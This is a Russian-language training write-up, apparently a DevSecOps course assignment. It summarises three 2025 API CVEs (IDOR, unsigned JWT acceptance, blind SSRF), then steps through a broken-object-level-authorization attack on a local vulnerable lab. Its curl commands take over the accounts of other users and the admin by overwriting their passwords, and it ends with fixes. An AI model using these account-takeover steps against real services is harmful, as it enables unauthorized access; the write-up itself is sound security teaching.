Часть I. Три CVE за последний год

Подобрала три уязвимости из разных категорий OWASP API Top 10 (2023),
чтобы покрыть сразу BOLA, Broken Authentication и SSRF.

CVE-2025-12030 --- IDOR в плагине ACF to REST API (WordPress)

Категория: API1 --- Broken Object Level Authorization. CWE-639.

Плагин добавляет в WordPress эндпоинт POST /wp-json/acf/v3/{type}/{id}
для редактирования ACF-полей. В функции update_item_permissions_check()
стоит только current_user_can(\'edit_posts\') --- это проверка «можешь
ли ты в принципе что-то редактировать», а не «можешь ли ты редактировать
конкретно вот этот объект». В итоге Contributor может править ACF-поля
на чужих постах, у других пользователей и даже у глобальных опций сайта
через /options/{id}.

CVE-2025-9485 --- обход проверки JWT в OAuth SSO для WordPress

Категория: API2 --- Broken Authentication. CWE-347.

Плагин miniOrange OAuth SSO принимает id_token от внешних провайдеров. В
функции get_resource_owner_from_id_token() токен декодируется, claims
вытаскиваются и используются для логина --- но подпись JWT никто не
проверяет. То есть можно сформировать JWT с любым email и sub, поставить
любую «подпись» --- и плагин залогинит как того пользователя, чей email
указан в payload, включая администратора.

CVE-2025-20371 --- неаутентифицированный blind SSRF в Splunk Enterprise

Категория: API7 --- Server-Side Request Forgery. CWE-918.

Через определённые REST-эндпоинты Splunk неаутентифицированный атакующий
заставляет Splunk-сервер делать произвольные исходящие HTTP-запросы.
Ответ обратно не возвращается, поэтому SSRF «слепой» --- но этого
хватает, чтобы сканировать внутреннюю сеть по таймингам, дёргать
metadata-сервисы облака (169.254.169.254) или тыкаться во внутренние API
от имени Splunk.

Часть II. Эмуляция атаки

Подготовка стенда

docker pull ket9/otus-devsecops-owasp-rest docker run -d -p 8080:8080
ket9/otus-devsecops-owasp-rest:latest curl
http://localhost:8080/createdb

Что я делала и что видела

Сначала посмотрела, кто уже в базе.

curl http://localhost:8080/users/v1

Дальше дёрнула \_debug.

curl http://localhost:8080/users/v1/\_debug

Зарегистрировала свою тестовую учётку (с рабочим email).

curl -X POST http://localhost:8080/users/v1/register -H \"Content-Type:
application/json\" -d
\"{\\\"username\\\":\\\"hacker\\\",\\\"password\\\":\\\"hack123\\\",\\\"email\\\":\\\"hacker@example.com\\\"}\"

Логин и получение токена (токен копируем вручную из вывода и сохраняем в
переменную).

curl -X POST http://localhost:8080/users/v1/login -H \"Content-Type:
application/json\" -d
\"{\\\"username\\\":\\\"hacker\\\",\\\"password\\\":\\\"hack123\\\"}\"

Важно: Из ответа копируем значение auth_token и сохраняем в переменную:
set TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\...

Проверка: поменяла свой email (домен обязателен).

curl -X PUT http://localhost:8080/users/v1/hacker/email -H
\"Authorization: Bearer %TOKEN%\" -H \"Content-Type: application/json\"
-d \"{\\\"email\\\":\\\"hacker_new@example.com\\\"}\"

Ожидаемый ответ: 204 No Content

Атака --- смена пароля чужого пользователя name1.

curl -i -X PUT http://localhost:8080/users/v1/name1/password -H
\"Authorization: Bearer %TOKEN%\" -H \"Content-Type: application/json\"
-d \"{\\\"password\\\":\\\"pwned\\\"}\"

Логин под взломанным name1.

curl -X POST http://localhost:8080/users/v1/login -H \"Content-Type:
application/json\" -d
\"{\\\"username\\\":\\\"name1\\\",\\\"password\\\":\\\"pwned\\\"}\"

Атака на админа.

curl -X PUT http://localhost:8080/users/v1/admin/password -H
\"Authorization: Bearer %TOKEN%\" -H \"Content-Type: application/json\"
-d \"{\\\"password\\\":\\\"pwned\\\"}\"

curl -X POST http://localhost:8080/users/v1/login -H \"Content-Type:
application/json\" -d
\"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"pwned\\\"}\"

Что нашла

Основная уязвимость: на PUT /users/v1/{username}/email и PUT
/users/v1/{username}/password сервер проверяет только факт
аутентификации (валидный JWT --- пускаем), но не сравнивает username из
токена с username в URL. Любой залогиненный пользователь может поменять
email или пароль любого другого пользователя, включая админа.

Дополнительно: эндпоинт /users/v1/\_debug возвращает всех пользователей
со всеми полями, включая пароли в открытом виде.

Тип уязвимости

Основная уязвимость --- API1:2023 --- Broken Object Level Authorization
(BOLA), по CWE --- CWE-639.

Как это чинить

1\. Проверять, что username в URL совпадает с subject из токена. 2.
Вообще убрать username из URL для self-actions --- использовать
/users/v1/me/password. 3. Условие владения прямо в SQL --- WHERE
username = ? AND username = current_user. 4. Никаких отладочных ручек в
проде --- убрать /\_debug. 5. Логирование и алёртинг --- подозрительная
активность по разным object key. 6. Контрактные тесты в CI --- тест от
имени userA к ресурсу userB должен возвращать 403.
